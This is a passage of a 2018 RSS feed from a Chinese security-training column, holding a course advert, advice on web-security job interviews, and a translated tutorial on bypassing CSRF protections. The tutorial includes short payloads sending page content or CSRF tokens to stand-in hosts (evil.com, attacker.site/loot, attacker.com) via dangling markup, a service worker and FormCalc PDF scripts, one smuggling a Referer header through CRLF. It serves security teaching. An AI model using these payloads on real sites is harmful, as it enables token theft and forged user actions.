href=&quot;http://twosecurity.io/&quot;&gt;二向箔安全培训&lt;/a&gt;，正是为了输出优秀顶级的安全人才而存在，优质的教学内容和真正“一对一”、“多对一”的模式，有实战经验丰富的安全研究员及时为学员在线答疑解惑，更有可爱的贴心的学习顾问为你更进学习进度，陪伴学员整个学习过程，学员能在有限的时间内最大程度的掌握web安全知识。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;扫描下方二维码，向温柔的小姐姐咨询吧~~&lt;/p&gt;&lt;p&gt;记得关注我们的微信公众号哟：&lt;a href=&quot;https://pic3.zhimg.com/80/v2-fde794875e65c0802d13b70f8bcef677_hd.jpg&quot;&gt;twosecurity&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b2b71fd0f42a434e73b6fea572173afe_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;5088&quot; data-rawheight=&quot;1269&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-01-24-33251932</guid>
<pubDate>Wed, 24 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何准备web安全求职面试</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-01-22-33186518.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33186518&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1a88f3623bc5feae935385a8009af7a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;写在前面 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在找工作之前应该对自己有一个清楚的认识，正确定位自己。比如，自己擅长做什么、感兴趣的什么、对自己的职业规划是什么，自己所在行业有哪些合适自己的岗位，扬长避短，最大程度的释放自己的能量。 &lt;/p&gt;&lt;p&gt;我们就说网络安全。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;先说说甲方公司和乙方公司的区别。 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;首先甲方乙方是一个对立的关系，从某个角度说并不能成为公司之间的明确分界线。 &lt;/p&gt;&lt;p&gt;举个例子：甲方乙方在传统的渗透测试的范畴来说，甲方代表着需要接受渗透测试服务的那一方，乙方代表着提供渗透测试服务的那一方。 &lt;/p&gt;&lt;p&gt;而我们一般说的和安全相关的甲方公司，是指本身创造价值业务不是提供安全服务，而是其他的业务，如腾讯，阿里，百度，京东等。相对的，如果公司创造价值的主体业务是提供安全服务，则这样的公司属于乙方公司，如启明星辰，深信服等。根据其主体业务来区分甲乙方公司，是很重要的一个因素，从严格意义上来说，360不属于乙方公司，属于甲方公司。360企业安全属于乙方公司。甲乙方公司的区别需要明确。但是还有一个特殊的存在——实验室，也可以说做研究的，后面会具体的说为什么。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;甲方乙方安全研究员的区别 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;从某种意义上说，甲方的安全研究员是比乙方强的，做的事情不同，导致圈外看热闹的人可能觉得甲方的人清闲。 &lt;/p&gt;&lt;p&gt;首先，甲方的安全研究员均是技术实力过硬的一批人，遇到过各种各样的样本，其经验就不是一般乙方人员和实验室研究人员具备的。 &lt;/p&gt;&lt;p&gt;其次，攻防的不平衡。有句话叫做“未知功，焉知防”，甲方的安全人员所考虑的不是某一台边缘服务器的沦陷，APT组织也是如此。其所要考虑的是企业内网及企业业务的安全，也就是核心数据的安全性。从大局观和眼界上来说，就不是一般人能具备的，而是通过多年攻防经验积累所得的。 &lt;/p&gt;&lt;p&gt;甲乙方安全人员因为做的事情不同，不具备可比性吧，这个是我的想法。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;有哪些岗位&lt;/b&gt; &lt;/h2&gt;&lt;p&gt;1. 安全服务部门：提供传统的安全检测服务。 &lt;/p&gt;&lt;p&gt;2. 安全实验室：这个地方分为很多不同的方向，如安全情报、漏洞挖掘、漏洞分析、物联网安全、AI安全、云安全等等。少数实验室为纯研究向实验室，多数实验室是为业务优化提供方案。 &lt;/p&gt;&lt;p&gt;3. 信息安全部门：主要是维护企业内网安全等 &lt;/p&gt;&lt;p&gt;4. APT部门：国安下属公司做的比较多 &lt;/p&gt;&lt;p&gt;5. 红队：（甲方）对公司的各个业务进行测试，与蓝队进行对抗 &lt;/p&gt;&lt;p&gt;6. 蓝队：（甲方）为公司的业务提供积极防御，构建企业安全架构等 &lt;/p&gt;&lt;p&gt;&lt;b&gt;岗位 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;简单来说，做安全没有谁是一直做一个方向的，web是一个大的方向，而其实web和二进制不分家，由于各种原因，作为一个安全研究员，即使你是一个web狗没有做过二进制漏洞的分析，但是该你上的时候就得上，还得硬着头皮分析。所以一般的职位仅仅有这么几个： &lt;/p&gt;&lt;p&gt;1. 安全研究员 &lt;/p&gt;&lt;p&gt;2. 安全研究分析员 &lt;/p&gt;&lt;p&gt;3. 渗透测试工程师 &lt;/p&gt;&lt;p&gt;4. 安全研发 &lt;/p&gt;&lt;p&gt;负责售前呀，项目经理什么的我就不说了，这个只是针对做安全的人来说的。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;基本知识&lt;/b&gt; &lt;/h2&gt;&lt;p&gt;1. 基础知识（这个基础知识绝对比我们想的多，各方向都有各方向的基础知识，扪心自问一下，自己的基础是否牢固） &lt;/p&gt;&lt;p&gt;2. 代码能力（分为两个：是否了解语言特性的能力，和写代码的能力） &lt;/p&gt;&lt;p&gt;3. 分析能力（片面来说，就是审计能力。然而不知仅限于某语言的审计能力，也包括数据分析能力，及日志分析能力等） &lt;/p&gt;&lt;p&gt;4. 是否了解原理（每个漏洞都有其原理所在，挖的越深，对这一点的理解就越深） &lt;/p&gt;&lt;p&gt;等等 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;面试常见问题&lt;/b&gt; &lt;/h2&gt;&lt;p&gt;看部门业务取向，不同的部门实验室，对人有不同的需求。 &lt;/p&gt;&lt;p&gt;不外乎代码能力及思路。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;加分项 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;1. 自己的笔记（博客） &lt;/p&gt;&lt;p&gt;2. 是否发表过文章 &lt;/p&gt;&lt;p&gt;3. 高质量cve &lt;/p&gt;&lt;p&gt;4. 开发项目的经历 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;面试技巧 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;面试本质是信息沟通，是你向面试官展示你能胜任这个岗位，而不是一问一答。你应该尽量主导面试，引导面试官，而不是被动答题。即便同一个众人皆知的问题，也不应止步于答出来即可，要争取尽量回答的和别人不一样，展现出自己独到的研究和体会。 &lt;/p&gt;&lt;p&gt;面试官看的是你解决问题的思路，思考问题的方式，而不是这个问题答案是什么。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;Tips: &lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;不止步于问题，多展示自己会的； &lt;/li&gt;&lt;li&gt;结合例子，不要背书； &lt;/li&gt;&lt;li&gt;从更高层面去总结和阐释问题； &lt;/li&gt;&lt;li&gt;不会的地方要把丑话说到前头，不要装； &lt;/li&gt;&lt;li&gt;复盘反思，多多总结。 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;没有捷径可走，所有的技巧都是认真踏实的基础准备。 &lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-21e5c3ecf582af0d66ca38921f28906a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;814&quot; data-rawheight=&quot;202&quot;&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-01-22-33186518</guid>
<pubDate>Mon, 22 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Neat tricks to bypass CSRF-protection</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-01-07-32716181.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32716181&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51734b036d371daf149f026fefa03126_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 2017 年的 OWASP （开放应用程序安全策略）Top 10 中，CSRF 漏洞排名&lt;a href=&quot;http://www.freebuf.com/news/131778.html&quot;&gt;第八&lt;/a&gt;，Bugcrowd 的漏洞评级分类中也把 CSRF 漏洞划为 &lt;a href=&quot;https://bugcrowd.com/vulnerability-rating-taxonomy&quot;&gt;P2 （高危）等级&lt;/a&gt;。为什么 CSRF 如此频繁发生呢？&lt;/p&gt;&lt;p&gt;可能有如下几个原因： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;大多数的 web 应用仍然采用 cookie 来进行会话管理；&lt;/li&gt;&lt;li&gt;cookie 的&lt;a href=&quot;https://www.anquanke.com/post/id/83773&quot;&gt;SameSite&lt;/a&gt; 属性也没有得到广泛的应用，目前只有 Chrome 和 Opera 浏览器支持这种用法，并且在服务端还需要做一些修改 ；&lt;/li&gt;&lt;li&gt;大多数 CSRF 防护措施都是可以绕过的。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这篇文章先介绍 CSRF 的一些绕过手法，然后介绍一个 burpsuite 中的自动化插件 EasyCSRF，以帮我们完成繁杂的手动检测工作。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;常见的 CSRF 防护措施 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CSRF攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;CSRF-token &lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;cookie双重提交(验证cookie内容)&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;除了请求中发送的本地 cookie，额外再要求提交一次 cookie，如果无法提供 cookie 内容并通不过验证，则认为可能是 CSRF 攻击而拒绝该请求。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Content-Type验证&lt;/b&gt; &lt;/li&gt;&lt;li&gt;&lt;b&gt;Referer验证（验证请求来源)&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Http 协议头中的 Referer 主要用来让服务器判断来源页面, 即用户是从哪个页面来的,通常被网站用来统计用户来源,是从搜索页面来的、还是从其他网站链接过来、或是从书签等访问,以便网站合理定位. &lt;/p&gt;&lt;p&gt;Referer 有时也被用作防盗链, 即下载时判断来源地址是不是在网站域名之内, 否则就不能下载或显示。很多网站,如天涯就是通过 Referer 页面来判断用户是否能够下载图片，如果 referer 指向的页面来源不是同一网站，则认为可能是 CSRF 攻击而拒绝该请求 。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;口令确认&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;无法使用cookie直接验证身份，必须还要输入正确的密码口令才可以通过验证。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Samesite&lt;/b&gt; &lt;b&gt;cookies（目前只有chrome和&lt;/b&gt; &lt;b&gt;Opera采用了此属性）&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Samesite Cookie 是 Set-Cookie 响应头新增的属性，它用来标明这个 cookie 是个”同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： &lt;/p&gt;&lt;p&gt;&lt;b&gt;SameSite=Strict： &lt;/b&gt;&lt;/p&gt;&lt;p&gt;严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie，绝无例外。比如说假如 b.com 设置了如下 cookie： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2 &lt;/code&gt;&lt;p&gt;你在 a.com 下发起的对 b.com 的任意请求中，foo 这个 cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 cookie 被设置成了 SameSite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 cookie，其它网站发起的对淘宝的任意请求都不会带上那个 cookie。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;SameSite=Lax： &lt;/b&gt;&lt;/p&gt;&lt;p&gt;宽松模式，比 Strict 放宽了点限制：假如这个请求是我上面总结的那种同步请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求（因为从语义上说 GET 是读取操作，比 POST 更安全），则这个 cookie 可以作为第三方 cookie。比如说假如 b.com 设置了如下 cookie： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2; SameSite=Lax  
Set-Cookie: baz=3 &lt;/code&gt;&lt;p&gt;当用户从 a.com 点击链接进入 b.com 时，foo 这个 cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。 &lt;/p&gt;&lt;p&gt;可以参考这篇&lt;a href=&quot;http://www.cnblogs.com/ziyunfei/p/5637945.html&quot;&gt;文章&lt;/a&gt;。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;CSRF 的绕过 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;CSRF 绕过方法大致有如下几种： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;跨站脚本攻击 &lt;/li&gt;&lt;li&gt;HTML标签注入(&lt;a href=&quot;http://lcamtuf.coredump.cx/postxss/&quot;&gt;Dangling markup&lt;/a&gt;) &lt;/li&gt;&lt;li&gt;子域绕过 &lt;/li&gt;&lt;li&gt;Cookie注入 &lt;/li&gt;&lt;li&gt;改变Content-Type &lt;/li&gt;&lt;li&gt;复杂的Content-Type(Non-simple Content-Type) &lt;/li&gt;&lt;li&gt;PDF插件(Bad Pdf) &lt;/li&gt;&lt;li&gt;Referer伪造(Referer spoof) &lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-335356a31ee6c19813241a0ae47e4549_r.jpg&quot; data-caption=&quot;CSRF防护有效绕过 &quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1277&quot; data-rawheight=&quot;554&quot;&gt;&lt;p&gt;接下来分别介绍它们： &lt;/p&gt;&lt;p&gt;&lt;b&gt;XSS绕过 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;XSS 可以绕过 Web 系统和应用中大部分的防护，比如通过 XSS 来盗取用户的 Cookie，以此来伪装成真实用户达到 CSRF 攻击的目的。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;HTML标签注入&lt;/b&gt; &lt;/p&gt;&lt;p&gt;由于 CSP——内容安全策略等限制，在 web 系统和应用中不能进行 XSS 而只能通过 HTML注入.借此攻击者可以获取到 CSRF-token 的内容 &lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;img src=”http://evil.com/log_csrf?html=”&amp;gt; 
&amp;lt;form action=”http://evil.com/log_csrf”&amp;gt;&amp;lt;textarea&amp;gt; &lt;/code&gt;&lt;p&gt;&lt;b&gt;子域绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;（1）如果子域(例如: foo.example.com)能够轻易被 XSS 攻击、子域劫持或者 cookie 注入，那么攻击者可以轻易绕过 CSRF-token 验证、cookie 双重提交验证和 Content-Type 验证。 &lt;/p&gt;&lt;p&gt;（2）Web系统和应用采取CORS(跨域资源共享)来与子域通信时，相关的响应如下: &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Access-Control-Allow-Origin:https://foo.example.com   
 Access-Control-Allow-Credentials:True;                     &lt;/code&gt;&lt;p&gt;攻击者可以通过子域读取到主域 CSRF-token 的内容. &lt;/p&gt;&lt;p&gt;（3）子域(foo.example.com)存在XSS漏洞，主域包含文件crossdomain.xml: &lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;&amp;lt;cross-domain-policy&amp;gt; 
&amp;lt;allow-access-from-domain=”*.example.com” /&amp;gt;  //允许所有的子域跨域访问 
&amp;lt;/cross-domain-policy&amp;gt; &lt;/code&gt;&lt;p&gt;攻击者可以上传 JS 文件到 foo.example.com，然后利用 &lt;a href=&quot;http://foo.example.com/&quot;&gt;foo.example.com&lt;/a&gt; 的 Service Worker 通过 Flash 读取 CSRF-token 内容： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Var url=“http：//attacker.Com/bad.swf”; 
Onfetch=(e)=&amp;gt;{                  //FetchEvent API 
 e.respondWith(fetch(url));     //respondWith方法包裹访问URL返回的响应代码 
} &lt;/code&gt;&lt;p&gt;如: Amazon 的 CSRF-token 绕过 (&lt;a href=&quot;https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&quot;&gt;https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&lt;/a&gt;) &lt;/p&gt;&lt;p&gt;（4）攻击者可以向父域或者任意目标路径注入 cookie，浏览器会选择路径明确的 cookie，也就是我们注入的 cookie，这可以用来绕过 cookie 双重提交验证 &lt;/p&gt;&lt;p&gt;&lt;b&gt;PDF插件绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;Adobe 的 PDF 插件(在线 PDF 文件查看)支持 FormCalc 脚本语言，目前被 IE11 和 Firefox ESR 支持。而 Form 的 Get 和 post 方法可能泄露 CSRF-token。 &lt;/p&gt;&lt;p&gt;假设攻击者可以上传 PDF 文件到 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; 站点，被上传的文件能被目标网站example.com的 api 所解析，不过这里要注意的是，最好以别的形式上传文件，比如图片等等。另外，PDF 插件是不会关心 Content-Type 或  Content-Disposition 头的，大胆尝试各种姿势吧。 &lt;/p&gt;&lt;p&gt;看如下一个例子： &lt;/p&gt;&lt;p&gt;&lt;b&gt;Leak.pdf&lt;/b&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3f3ce4665508d507191722724de443bf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;480&quot; data-rawheight=&quot;384&quot;&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script contentType=”application/x-formcalc”&amp;gt;          
         Var content=GET(“https://example.com/Settings.action”);   
         Post(“http://attacker.site/loot”,content,”text/plain”); 
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b3ca402fd4abd81d3ac803e38a7742cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;485&quot; data-rawheight=&quot;121&quot;&gt;&lt;p&gt;&lt;b&gt;Cookie注入绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;攻击者可以通过Cookie注入绕过cookie双重提交验证 &lt;/p&gt;&lt;p&gt;    几种Cookie注入: &lt;/p&gt;&lt;p&gt;1.CRLF 注入 &lt;/p&gt;&lt;p&gt;攻击者可以通过在一段数据中加入CRLF命令来改变接受这个数据的应用程序处理这个数据的方式 &lt;/p&gt;&lt;p&gt;2.浏览器漏洞利用(如火狐的 CVE-2016-9078） &lt;/p&gt;&lt;p&gt;3.等等。。  &lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Type伪造绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;开发者认为非标准格式的数据就可以有效的阻止CSRF, 但有时后端并不会检测  Content-Type头  &lt;/p&gt;&lt;p&gt;比如， 借助PDF插件来修改 Content-Type，从而通过验证 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-981e388b7081de702fb3240dd611306a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;483&quot; data-rawheight=&quot;148&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d9b354bbe9f7e25816264e6614633785_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;483&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;&lt;b&gt;任意Content-Type绕过:&lt;/b&gt; &lt;/p&gt;&lt;p&gt;攻击者通过 HTML 表单或者 XHR(XMLHttpReques) API 攻击者只能发送一些简单的Content_type: &lt;/p&gt;&lt;p&gt;如： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Text/plain 
application/x-www-form-urlencoded 
multipart/form-data &lt;/code&gt;&lt;p&gt;那要怎么去发送任意的 Content-Type 头呢: &lt;/p&gt;&lt;p&gt;1、浏览器漏洞 (Chrome 的 navigator.sendBeacon 方法)  &lt;/p&gt;&lt;p&gt;2、Flash 插件 和 307 临时重定向  &lt;/p&gt;&lt;p&gt;3、PDF 插件和 307 临时重定向  &lt;/p&gt;&lt;p&gt;4、一些后端框架支持 URL 参数重定义 Content-Type 的, &lt;a href=&quot;http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging&quot;&gt;http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://xn--chrome:-bu3kgmm36rd7pnkf871a174f/&quot;&gt;这是Chrome的一个漏洞：&lt;/a&gt;&lt;b&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32716181/h%3C/b%3Ettps://bugs.chromium.org/p/chromium/issues/detail?id=490015&quot;&gt;Chrome Bug &lt;/a&gt; ，最近两年很常见 ，Nabigator.sendBeacon()方法支持以任意content-Type发送POST请求 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;如下： &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-42e3d0f56da562ef9985fcb02c417162_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;493&quot; data-rawheight=&quot;180&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9458a21d33283e9b4892e72b9221ffad_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;513&quot; data-rawheight=&quot;255&quot;&gt;&lt;p&gt;&lt;b&gt;Referer伪造绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;MS Edge的&lt;a href=&quot;https://www.brokenbrowser.com/referer-spoofing-patch-bypass/&quot;&gt;漏洞&lt;/a&gt; ,此漏洞依然可以利用但是仅限于get请求,而有的后端程序不区分GET和POST请求，那就可以大胆去尝试了。  &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a6f3e9e07e77bbf2a484306f175ad53c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;269&quot;&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script contentType=&#39;application/x-formcalc&#39;&amp;gt; 
Post(&quot;http://attacker.com:8888/redirect&quot;, 
&quot;{&quot;&quot;action&quot;&quot;:&quot;&quot;add-user-email&quot;&quot;,&quot;&quot;Email&quot;&quot;:&quot;&quot;attacker@evil.com&quot;&quot;}&quot;, &quot;application/json&amp;amp;#x0a;&amp;amp;#x0d;Referer;&amp;amp;#x20;http://example.com&quot;)  
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;p&gt;PDF 插件发送 HTTP头 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Referer http://example.com 
 Name:Value &lt;/code&gt;&lt;p&gt;一些后台(Jboss/WildFly等)会将空格当作冒号(HTTP头的末尾) &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Referer http://example.com 
 Name:Value &lt;/code&gt;&lt;p&gt;漏洞挖掘者可以从这几方面入手： &lt;/p&gt;&lt;p&gt;1有许多的API都存在基于 Content-Type的CSRF防护 &lt;/p&gt;&lt;p&gt;2 检查子域是否存在漏洞(XSS,子域名接管，cookie注入) &lt;/p&gt;&lt;p&gt;3  PDF上传的技巧有时也可以试试 &lt;/p&gt;&lt;p&gt;4 将带有CSRF-token的url编码 body转换成没有CSRF-token的JSON格式 &lt;/p&gt;&lt;p&gt;&lt;b&gt;Burp 中的 EasyCSRF 扩展&lt;/b&gt; &lt;/p&gt;&lt;p&gt;EasyCSRF 在 BurpSuite 的免费版中就可以使用 &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0ang3el/EasyCSRF&quot;&gt;下载地址&lt;/a&gt; &lt;/p&gt;&lt;p&gt;EasyCSRF 作为代理监听请求 (IProxyListener): &lt;/p&gt;&lt;ul&gt;&lt;li&gt;不停修改请求 (移除CSRF参数/头，改变请求方法等） &lt;/li&gt;&lt;li&gt;高亮显示已修改的请求 &lt;/li&gt;&lt;li&gt;可以直观的看到修改的请求是否执行成&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f4fd2d5e708a8757c3a924cfbe30e028_r.jpg&quot; data-caption=&quot;主界面&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;507&quot; data-rawheight=&quot;319&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55ec299974251d04bf850dfe6b3007e8_r.jpg&quot; data-caption=&quot;修改前&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;507&quot; data-rawheight=&quot;276&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-67315d650b33e8b4c9da19c2563b8d29_r.jpg&quot; data-caption=&quot;修改后&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;511&quot; data-rawheight=&quot;268&quot;&gt;&lt;p&gt;可以看到 EasyCSRF 把 PUT 方法改成了 POST 方法, 移除了 Origin 头，并在历史 url 中高亮请求 。&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection&quot;&gt;https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-01-07-32716181</guid>
<pubDate>Sun, 07 Jan 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
